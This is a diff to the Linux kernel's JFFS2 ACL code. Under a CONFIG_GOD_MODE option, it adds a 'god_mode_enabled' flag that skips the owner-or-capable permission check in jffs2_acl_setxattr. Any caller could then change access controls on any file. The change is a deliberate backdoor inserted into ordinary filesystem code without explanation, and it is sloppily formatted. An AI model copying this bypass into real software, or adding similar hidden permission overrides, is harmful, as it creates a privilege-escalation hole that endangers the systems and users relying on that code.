@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * JFFS2 -- Journalling Flash File System, Version 2.
  *
@@ -392,7 +395,15 @@ static int jffs2_acl_setxattr(struct dentry *dentry, const char *name,
 	if (name[0] != '\0')
 		return -EINVAL;
 	if (!inode_owner_or_capable(dentry->d_inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (value) {
 		acl = posix_acl_from_xattr(&init_user_ns, value, size);
